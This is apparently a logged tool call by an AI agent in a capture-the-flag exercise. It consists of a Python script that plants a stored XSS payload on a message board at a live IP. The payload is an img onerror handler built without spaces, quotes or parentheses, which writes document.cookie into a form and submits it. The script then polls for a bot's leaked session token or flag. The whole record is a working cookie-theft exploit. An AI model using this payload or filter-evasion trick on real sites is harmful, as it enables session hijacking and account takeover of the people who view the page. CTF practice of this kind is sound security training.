@@ -1,0 +1,10 @@
+{
+  "tool": "py_run",
+  "arguments": {
+    "code": "\nimport time, re, urllib.request, urllib.parse\nBASE = \"http://160.202.254.160:15880/\"\nPROXY = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\nop = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))\n\ndef get(data=None):\n    d = urllib.parse.urlencode(data).encode() if data is not None else None\n    with op.open(BASE, data=d, timeout=20) as r:\n        return r.read().decode(\"gb18030\", \"replace\")\n\n# 无空格/无括号/无分号/无引号 的 JS：\n#   document.forms[0].content.value=document.cookie, document.forms[0].submit``\nJS = \"document.forms[0].content.value=document.cookie,document.forms[0].submit``\"\nPAYLOAD = \"[img]x[img] onerror=\" + JS + \" [/img]\"\nprint(\"植入 payload:\")\nprint(\"  \", PAYLOAD)\nget({\"content\": PAYLOAD})\nprint(\"已提交，开始轮询等待机器人...\")\n\nseen = set()\nfound = None\nfor i in range(24):          # 24 * 5s = 120s\n    time.sleep(5)\n    body = get()\n    blocks = re.findall(r\"<pre>(.*?)<p>IP\", body, re.S)\n    new = [b for b in blocks if b not in seen]\n    seen.update(blocks)\n    for b in new:\n        if \"onerror\" in b:\n            continue\n        print(\"[%3ds] 新消息: %r\" % ((i+1)*5, b[:160]))\n        if re.search(r\"(flag|PHPSESSID|session|token)\", b, re.I):\n            found = b\n    if found:\n        break\n\nprint()\nif found:\n    print(\"### 捕获到疑似凭据 ###\")\n    print(found)\n    m = re.search(r\"flag\\{[^}]*\\}\", found)\n    if m:\n        print(\"FLAG:\", m.group(0))\nelse:\n    print(\"120 秒内没有捕获到机器人回传的 cookie\")\n",
+    "timeout": 240,
+    "wp_purpose": "植入XSS外带payload并轮询等待机器人访问",
+    "wp_case": "ctf-fca56ff3a53c802b"
+  },
+  "operation_id": "55a96806353047779e4270a9fc29b220"
+}
